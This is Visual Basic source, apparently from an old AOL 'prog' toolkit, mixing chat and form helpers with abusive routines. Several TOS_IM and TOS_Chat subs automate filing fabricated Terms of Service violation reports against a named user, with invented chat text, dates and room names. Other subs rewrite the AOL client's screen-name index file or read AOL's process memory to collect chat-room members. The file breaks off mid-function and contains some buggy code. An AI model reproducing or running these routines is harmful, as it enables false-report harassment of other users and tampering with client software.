Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function

Function GetChatText()
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
ChatText = GetText(AORich%)
GetChatText = ChatText
End Function

Function LastChatLineWithSN()
'duh this will get the text from
'the last chatline with the sn
' used in many bots and shit like that
ChatText$ = GetChatText

For FindChar = 1 To Len(ChatText$)

thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
LastLine = Mid(ChatText$, lastlen, Len(thechars$))

LastChatLineWithSN = LastLine
End Function

Function SNFromLastChatLine()
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = SN
End Function

Function LastChatLine()
'duh this will get the text from
'the last chatline , used in many
'bots and shit like that
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub AddRoomToListBox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
TheList.Clear
budlist% = findchildbytitle(AoLMDI(), "Buddy List Window")
room = FindChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem "(" & Person$ & ")"
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub Kill_KW_not_found_msg()
'hey I don't get y ne1 would wanna
'kill it but I have been asked like
'30 times by different peeps so here
'I added a sub for it
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
NF% = findchildbytitle(mdi%, "keyword Not Found")
Call AOLKillWindow(NF%)
End Sub
Sub Rollform2(frm As Form, STEPS As String, finish As String)
Do
frm.Height = frm.Height - STEPS
Loop Until frm.Height = finish
'Finish should never be less than 405
'if u use a # less than that it will
'lock up VB on ya
'Steps are how many steps u wanna -
'Example of code
'Rollform2 Form1 , 10 , 500

End Sub

Function PlayAvi()
'Plays a AVI File Change the path Below to your
'AVI Path
lRet = MciSendString("play c:\RaVaGe.avi", 0&, 0, 0)
End Function
Function PlayMidi()
'Plays a Midi File Change the path Below to your
'Midi Path
lRet = MciSendString("play C:\RaVaGe.mid", 0&, 0, 0) ' or whatever the File Name is
End Function

Sub Form_Scroll2(frm As Form, finished)
' This will make the form slowly scroll down
' you can add a timeout to make it go slower
' or faster
' Call Call Form_Scroll2(Form1, 1000)
If frm.Height > finished Then Exit Sub
If frm.Height = finished Then Exit Sub
Do
frm.Height = Val(frm.Height) + 1
Loop Until frm.Height = finished
End Sub
Sub Form_Scroll(frm As Form, finished)
' This will make the form slowly scroll up
' you can add a timeout to make it go slower
' or faster
' Call Form_Scroll(Form1, 1000)
If frm.Height < finished Then Exit Sub
If frm.Height = finished Then Exit Sub
Do
frm.Height = Val(frm.Height) - 1
Loop Until frm.Height = finished
End Sub
Sub Killbuddychats()

AOL% = FindWindow("AOL Frame25", 0&)
CloseBuddy% = findchildbytitle(AOL%, "Invitation from: ")
C% = SendMessageByNum(CloseBuddy%, WM_CLOSE, 0, 0)
End Sub

Sub macrokilla(txt As TextBox)

Dim thestring$
thestring$ = "txt.text"
SendChat thestring$
SendChat thestring$
SendChat thestring$
SendChat thestring$
Timeout 1.5
End Sub

Function ScrambleGame(thestring As String)
Dim bytestring As String

thestringcount = Len(thestring$)
If Not Mid(thestring$, thestringcount, 1) = " " Then thestring$ = thestring$ & " "
For Stringe = 1 To Len(thestring$)
characters$ = Mid(thestring$, Stringe, 1)
thestrings$ = thestrings$ & characters$

If characters$ = " " Then
smoked:
DoEvents
For Ensemble = 1 To Len(thestrings$) - 1
Randomize
randomstring = Int((Len(thestrings$) * Rnd) + 1)
If randomstring = Len(thestrings$) Then GoTo already
If bytesread Like "*" & randomstring & "*" Then GoTo already
stringrandom$ = Mid(thestrings$, randomstring, 1)
stringfound$ = stringfound$ & stringrandom$
bytesread = bytesread & randomstring
GoTo really
already:
Ensemble = Ensemble - 1
really:
Next Ensemble
If stringfound$ = thestrings$ Then stringfound$ = "": GoTo smoked
thestrings2$ = thestrings2$ & stringoound$ & " "
stringfound$ = ""
thestrings$ = ""
bytesread = ""
strngfound$ = ""
End If

Next Stringe
ScrambleGame = Mid(thestrings2$, 1, Len(thestring$) - 1)
End Function

Function ScrambleText(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Scrambles the text
For scrambling = 1 To Len(TheText)
thechar$ = Mid(TheText, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
scrambled$ = scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
ScrambleText = scrambled$

Exit Function
End Function
Sub AOLSNReset(SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
text$ = String(32000, 0)
Get #1, X, text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, text$, i, 1)
If Where1 Then
Mid(text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, text$, i, 1)
If Where2 Then
Mid(text$, Where2) = Replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub
Sub ResetNew(SN As String, pth As String)
Screen.MousePointer = 11
Static m0226 As String * 40000
Dim l9E68 As Long
Dim l9E6A As Long
Dim l9E6C As Integer
Dim l9E6E As Integer
Dim l9E70 As Variant
Dim l9E74 As Integer
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL is already reset to NewUser!"): Exit Sub
On Error GoTo no_reset
If Len(SN) < 7 Then MsgBox ("The Screen Name will not work unless it is at least 7 characters, including spaces"): Exit Sub
tru_sn = "NewUser" + String$(Len(SN) - 7, " ")
Let paath$ = (pth & "\idb\main.idx")
Open paath$ For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(40000, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend
Close #1
Screen.MousePointer = 0
no_reset:
Screen.MousePointer = 0
Exit Sub
Resume Next

End Sub
Sub MinToAOL(formname As Form)
Dim a As Variant
Dim b As Variant
Dim C As Variant

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTooL%, "_AOL_Icon")

a = FindWindow("AOL Frame25", vbNullString)
b = FindChildByClass(a, "MDICLIENT")
C = SetParent(formname.hwnd, AOL%)
L = Screen.Width
J = Screen.Height
'formname.Top = 1005
'formname.Left = 8805
End Sub

Sub TOS_IM_1(Who$, what$)
Ao_Keyword ("notifyaol")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Timeout 2#
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
Blah% = findchildbytitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(Blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
Timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin%
AOLKillWindow anal%
End Sub

Sub TOS_IM_2(Who$, what$)
Ao_Keyword ("kohelp")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "I Need Help!")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
bttn3% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Ao_Click bttn3%
Timeout 0.001
Do: DoEvents
toswin2% = findchildbytitle(mdi%, "Report A Violation")
bttnz% = FindChildByClass(toswin2%, "_AOL_Icon")
Blah% = GetNextWindow(bttnz%, 2)
tosbttn% = GetNextWindow(Blah%, 2)
Loop Until toswin2% <> 0
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
toswin3% = findchildbytitle(mdi%, "Violations via Instant Messages")
bull% = findchildbytitle(toswin3%, "Date")
datez% = GetNextWindow(bull%, 2)
bull2% = findchildbytitle(toswin3%, "Time AM/PM")
Timez% = GetNextWindow(bull2%, 2)
bull3% = findchildbytitle(toswin3%, "CUT and PASTE a copy of the IM here")
said% = GetNextWindow(bull3%, 2)
bull4% = GetNextWindow(said%, 2)
donez% = GetNextWindow(bull4%, 2)
Loop Until toswin3% <> 0
Timez2$ = pc_time()
Datez2$ = pc_date()
Shiz$ = Who$ + ":     " + what$
Ao_SetText datez%, Datez2$
Ao_SetText Timez%, Timez2$
Ao_SetText said%, Shiz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin2%
AOLKillWindow toswin%
End Sub

Sub TOS_IM_3(Who$, what$)
Ao_Keyword ("ineedhelp")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Timeout 2#
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
Blah% = findchildbytitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(Blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
Timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin%
End Sub

Sub TOS_IM_4(Who$, what$)
Ao_Keyword ("reachoutzone")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
reachwin% = findchildbytitle(mdi%, "AOL Neighborhood Watch")
fuck% = FindChildByClass(reachwin%, "RICHCNTL")
fuck2% = GetNextWindow(fuck%, 2)
fuck3% = GetNextWindow(fuck2%, 2)
fuck4% = GetNextWindow(fuck3%, 2)
fuck5% = GetNextWindow(fuck4%, 2)
fuck6% = GetNextWindow(fuck5%, 2)
fuck7% = GetNextWindow(fuck6%, 2)
fuck8% = GetNextWindow(fuck7%, 2)
Loop Until reachwin% <> 0
Timeout 3#
Ao_Click fuck8%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Timeout 2#
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
Blah% = findchildbytitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(Blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
Timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin%
AOLKillWindow reachwin%
End Sub

Sub TOS_IM_5(Who$, what$)
Ao_Keyword ("kohelp")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "I Need Help!")
tosbttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
toswin2% = findchildbytitle(AOL, "Report Password Solicitations")
Blah% = findchildbytitle(toswin2%, "Screen Name of Member Soliciting your Information:")
namez% = GetNextWindow(Blah%, 2)
blah2% = findchildbytitle(toswin2%, "Copy and Paste the solicitation here:")
textz% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(textz%, 2)
Loop Until toswin2% <> 0
whatz$ = Who$ + ": " + what$
Ao_SetText namez%, Who$
Ao_SetText textz%, whatz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin%
End Sub

Sub TOS_IM_6(Who$, what$)
Ao_Keyword ("guidepager")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
guidewin% = findchildbytitle(mdi%, "Request a Guide")
poop% = FindChildByClass(guidewin%, "_AOL_Icon")
Loop Until guidewin% <> 0
Ao_Click poop%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Timeout 2#
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
Blah% = findchildbytitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(Blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
Timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin%
AOLKillWindow guidewin%
End Sub

Sub TOS_IM_7(Who$, what$)
Ao_Keyword ("postmaster")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
anal% = findchildbytitle(mdi%, "Postmaster Online")
anal2% = FindChildByClass(anal%, "_AOL_Icon")
anal3% = GetNextWindow(anal2%, 2)
anal4% = GetNextWindow(anal3%, 2)
anal5% = GetNextWindow(anal4%, 2)
anal6% = GetNextWindow(anal5%, 2)
Loop Until anal% <> 0
Ao_Click anal6%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
bttn2% = GetNextWindow(bttn%, 2)
tosbttn% = GetNextWindow(bttn2%, 2)
Loop Until toswin% <> 0
Timeout 2#
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
Blah% = findchildbytitle(toswin%, "Enter Screen Name of Member Soliciting You:")
names% = GetNextWindow(Blah%, 2)
blah2% = GetNextWindow(names%, 2)
said% = GetNextWindow(blah2%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
Ao_SetText names%, Who$
Ao_Click said%
Timeout 0.001
whatz$ = "<HTML><PRE><FONT COLOR=" + Chr(34) + "#0000ff" + Chr(34) + " SIZE=2><B>" + Who$ + ":</B>     " + "<FONT COLOR = " + Chr(34) + "#000000" + " SIZE=3>" + what$
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin%
AOLKillWindow anal%
End Sub

Sub TOS_IM_8(Who$, what$)
Ao_Keyword ("aol://4344:50.DKPsurf2.6593499.548013513")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "Report Password Solicitations")
Blah% = findchildbytitle(toswin%, "Screen Name of Member Soliciting Your Information:")
editz% = GetNextWindow(Blah%, 2)
blah2% = GetNextWindow(editz%, 2)
richz% = GetNextWindow(blah2%, 2)
bttnz% = GetNextWindow(richz%, 2)
Loop Until toswin% <> 0
Ao_SetText editz%, Who$
whatz$ = Who$ + ": " + what$
Ao_Click richz%
Ao_SetText richz%, whatz$
Ao_Click bttnz%
Timeout 0.001
waitforok
End Sub
Sub TOS_Chat_1(Who$, what$)
Ao_Keyword ("aol://1391:43-25547")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "Notify AOL")
Loop Until toswin% <> 0
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Notify AOL")
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
      If Number = 4 Then roomz$ = roomz$ & "4"
      If Number = 5 Then roomz$ = roomz$ & "5"
      If Number = 6 Then roomz$ = roomz$ & "6"
      If Number = 7 Then roomz$ = roomz$ & "7"
      If Number = 8 Then roomz$ = roomz$ & "8"
      If Number = 9 Then roomz$ = roomz$ & "9"
generate$ = "Lobby " + roomz$
Ao_SetText rooms%, generate$
Ao_SetText Person%, Who$
whatz$ = Who$ + ":     " + what$
Ao_Click said%
Ao_SetText said%, whatz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin%
End Sub
Function GetNextWindow(hwnd As Integer, Num As Integer) As Integer
NexthWnd% = hwnd%
For X = 1 To Num
NexthWnd% = GetWindow(NexthWnd%, GW_HWNDNEXT)
Next X
GetNextWindow = NexthWnd%
End Function
Sub TOS_IM_9(Who$, what$)
Ao_Keyword ("aol://4344:1732.TOSnote.13706095.560712263")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(mdi%, "MDIClient")
toswinz% = findchildbytitle(mdi%, "Keyword: Notify AOL")
passd% = FindChildByClass(toswinz%, "_AOL_Icon")
Loop Until toswinz% <> 0
Timeout 2#
ClickIcon passd%
Timeout 0.001
Do: DoEvents
toswin% = findchildbytitle(mdi%, "Report Password Solicitations")
Blah% = findchildbytitle(toswin%, "Screen Name of Member Soliciting Your Information:")
editz% = GetNextWindow(Blah%, 2)
blah2% = GetNextWindow(editz%, 2)
richz% = GetNextWindow(blah2%, 2)
bttnz% = GetNextWindow(richz%, 2)
Loop Until toswin% <> 0
SetText editz%, Who$
whatz$ = Who$ + ": " + what$
ClickIcon richz%
SetText richz%, whatz$
ClickIcon bttnz%
Timeout 0.001
waitforok
End Sub

Sub AOLCreateMenu(mnuTitle As String, mnuPopUps As String)
'  This sub will append menus to AOL.  You need to assign
'  mnuPopUps$ a series of menus and indexes;
'  <menuName:Index;menuName:Index>
'  Here is an Example:

'  MenusToAdd$ = "New Item:1;&File:2;Killer:3"
'  Call aolCreateMenu("&Test", MenusToAdd$)

AOL% = FindWindow("AOL Frame25", vbNullString)
If AOL% = 0 Then Exit Sub
aolmenu% = GetMenu(AOL%)
hMenuPopup% = CreatePopupMenu()
SplitterCounter% = 0
For i = 1 To Len(mnuPopUps$)
ExamineChar$ = Mid$(mnuPopUps$, i, 1)
If ExamineChar$ = ":" Then SplitterCounter% = SplitterCounter% + 1
Next i
Egg$ = mnuPopUps$
For i = 0 To SplitterCounter%
If Egg$ = "" Then Exit For
If InStr(Egg$, ":") = 0 Then Exit For
mnuName$ = Left$(Egg$, InStr(Egg$, ":") - 1)
'Egg$ = Script(Egg$, mnuName$ & ":", "")
If InStr(Egg$, ";") <> 0 Then
mnuIndex% = CInt(Left(Egg$, InStr(Egg$, ";") - 1))
Else
mnuIndex% = CInt(Egg$)
End If
'Egg$ = Script(Egg$, Script(Str(mnuIndex%), " ", "") & ";", "")
q% = AppendMenu(hMenuPopup%, MF_ENABLED Or MF_STRING, mnuIndex%, mnuName$)
Next i
q% = AppendMenu(aolmenu%, MF_STRING Or MF_POPUP, hMenuPopup%, mnuTitle$)
DrawMenuBar AOL%

End Sub


Function pc_fulldate() As String
pc_fulldate$ = Format$(Now, "mm/dd/yy h:mm AM/PM")
End Function
Function pc_fulldate2() As String
pc_fulldate2$ = Format$(Now, "mmmm, dddd dd, yyyy")
End Function
Function pc_date() As String
pc_date$ = Format$(Now, "mm/dd/yy")
End Function

Function pc_time() As String
pc_time$ = Format$(Now, "h:mm AM/PM")
End Function
Sub TOS_Chat_2(Who$, what$)
Ao_Keyword ("kohelp")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "I Need Help!")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
tosbttn% = GetNextWindow(bttn%, 2)
Loop Until toswin% <> 0
Ao_Click tosbttn%
Timeout 0.001
Do: DoEvents
toswin2% = findchildbytitle(mdi%, "Notify AOL")
room% = FindChildByClass(toswin2%, "_AOL_Edit")
datez% = GetNextWindow(room%, 2)
shit% = GetNextWindow(datez%, 2)
names% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(names%, 2)
shit3% = GetNextWindow(shit2%, 2)
Lies% = GetNextWindow(shit3%, 2)
donez% = FindChildByClass(toswin2%, "_AOL_Icon")
Loop Until toswin2% <> 0
Randomize
    Phrases = 6
    Phrase2 = Int(Rnd * Phrases + 1)
      If Phrase = 1 Then rooms$ = "Blabbatorium1"
      If Phrase = 2 Then rooms$ = "Blabbatorium2"
      If Phrase = 3 Then rooms$ = "Blabbatorium3"
      If Phrase = 4 Then rooms$ = "Chatopia"
      If Phrase = 5 Then rooms$ = "Blabsville"
      If Phrase = 6 Then rooms$ = "Talksylvania"
Ao_SetText room%, rooms$
datezz$ = pc_fulldate()
Ao_SetText datez%, datezz$
namesz$ = Who$
Ao_SetText names%, namesz$
liesz$ = Who$ + ":     " + what$
Ao_SetText Lies%, liesz$
Ao_Click donez%
Timeout 0.001
waitforok
AOLKillWindow toswin2%
AOLKillWindow toswin%
End Sub
Sub Ao_Click(btn As Integer)
ClckMe% = SendMessageByNum(btn%, WM_LBUTTONDOWN, 0, 0&)
ClckMe% = SendMessageByNum(btn%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub Ao_SetText(SetThis As Integer, ByVal huh As String)
q% = SendMessageByString(SetThis%, WM_SETTEXT, 0, huh)
End Sub
Sub Ao_Keyword(Keywer$)
Call keyword(Keywer$)
End Sub


Sub TOS_Chat_3(Who$, what$)
Ao_Keyword ("notifyaol")
Do: DoEvents
AOL = FindWindow("AOL Frame25", 0&)
mdi% = FindChildByClass(AOL, "MDIClient")
toswin% = findchildbytitle(mdi%, "Keyword: Notify AOL")
bttn% = FindChildByClass(toswin%, "_AOL_Icon")
Loop Until toswin% <> 0
Timeout 2#
Ao_Click bttn%
Timeout 0.001
Do: DoEvents
dates% = FindChildByClass(toswin%, "_AOL_Edit")
shit% = GetNextWindow(dates%, 2)
rooms% = GetNextWindow(shit%, 2)
shit2% = GetNextWindow(rooms%, 2)
Person% = GetNextWindow(shit2%, 2)
shit3% = GetNextWindow(Person%, 2)
said% = GetNextWindow(shit3%, 2)
donez% = GetNextWindow(said%, 2)
Loop Until toswin% <> 0
datez$ = pc_fulldate()
Ao_SetText dates%, datez$
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = "1"
      If Number = 2 Then roomz$ = "2"
      If Number = 3 Then roomz$ = "3"
      If Number = 4 Then roomz$ = "4"
      If Number = 5 Then roomz$ = "5"
      If Number = 6 Then roomz$ = "6"
      If Number = 7 Then roomz$ = "7"
      If Number = 8 Then roomz$ = "8"
      If Number = 9 Then roomz$ = "9"
Randomize
    numbers = 9
    Number = Int(Rnd * numbers + 1)
      If Number = 1 Then roomz$ = roomz$ & "1"
      If Number = 2 Then roomz$ = roomz$ & "2"
      If Number = 3 Then roomz$ = roomz$ & "3"
